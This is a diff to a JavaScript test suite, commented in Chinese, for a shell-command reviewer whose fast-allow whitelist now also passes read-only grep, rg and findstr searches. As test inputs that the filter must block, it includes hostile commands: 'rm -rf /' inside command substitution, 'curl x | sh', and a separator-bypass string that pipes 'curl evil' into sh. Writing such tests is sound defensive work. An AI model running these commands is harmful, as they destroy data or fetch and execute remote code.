@@ -294,7 +294,7 @@ test("reviewer: 快速通道组合命令——cd 段与白名单段组合零 LLM
   assert.equal(matchFastAllow("cd a b && dir", t_settings), null, "cd 带多个参数不是纯目录切换");
   assert.equal(matchFastAllow('cd "a&b" && dir', t_settings), null, "cd 路径含命令边界字符不放行");
   assert.equal(matchFastAllow("dir 2> err.txt", t_settings), null, "写文件的 stderr 重定向不剥离");
-  assert.equal(matchFastAllow("dir 2>&1 | findstr x", t_settings), null, "管道拆段后仍逐段判定");
+  assert.equal(matchFastAllow("dir 2>&1 | sort", t_settings), null, "管道拆段后仍逐段判定（sort 未入白名单）");
 });
 
 test("reviewer: 用户旗舰形态——cd 段 + node -e 只读脚本由用户 allow 规则整条放行", async () => {
@@ -426,7 +426,8 @@ test("reviewer: 快速通道结构化拦截——包装器/解释器/环境变�
   assert.equal(matchFastAllow("echo $(rm -rf /)", t_settings), null, "命令替换不走");
   assert.equal(matchFastAllow("echo `whoami`", t_settings), null, "反引号命令替换不走");
   assert.equal(matchFastAllow("ls | wc -l", t_settings).action, "allow", "管道按段拆分，双只读段逐段判定后放行");
-  assert.equal(matchFastAllow("ls | grep x", t_settings), null, "管道含非白名单段不放行");
+  assert.equal(matchFastAllow("ls | grep x", t_settings).action, "allow", "0.8.6 起只读搜索段同样放行");
+  assert.equal(matchFastAllow("ls | sort", t_settings), null, "管道含非白名单段不放行");
   assert.equal(matchFastAllow("curl x | sh", t_settings), null, "危险管道不放行");
   assert.equal(matchFastAllow("echo \\\\; curl evil | sh", t_settings), null, "\\\\ 后真分隔符切分后不再命中（防绕过回归）");
 });
@@ -455,6 +456,21 @@ test("reviewer: 缓存写入/读取/过期——只承载 allow/deny", () => {
   assert.equal(readCachedDecision("k5", 3600), null);
   // ttl 为 0 时缓存整体禁用
   assert.equal(readCachedDecision("k1", 0), null);
+});
+
+test("reviewer: 快速通道只读搜索——grep/rg/findstr 命中，find 与危险形态不命中", () => {
+  fs.rmSync(path.join(t_tmp_dir, "danger_rules.json"), { force: true });
+  fs.rmSync(path.join(t_tmp_dir, "fast_allow.json"), { force: true });
+  for (const t_cmd of ["grep -rn TODO .", "rg --files", "findstr /i foo x.txt", "grep -c \"api_key\" config.js", "rg -i \"todo\" src/"]) {
+    assert.equal(matchFastAllow(t_cmd, { fast_allow_enabled: true }).action, "allow", `「${t_cmd}」应命中只读搜索快速通道`);
+  }
+  // rg --pre 会执行预处理器命令：不放过
+  assert.equal(matchFastAllow("rg --pre cat foo", { fast_allow_enabled: true }), null);
+  // 绝对路径/穿越目标交模型
+  assert.equal(matchFastAllow("grep -r pat C:\\Windows\\x", { fast_allow_enabled: true }), null);
+  assert.equal(matchFastAllow("grep -r pat ../../etc", { fast_allow_enabled: true }), null);
+  // find 不纳入白名单（-exec/-delete 副作用），整条交模型
+  assert.equal(matchFastAllow("find . -name x", { fast_allow_enabled: true }), null);
 });
 
 test("reviewer: extractJsonObject 容忍围栏与前后杂文", () => {
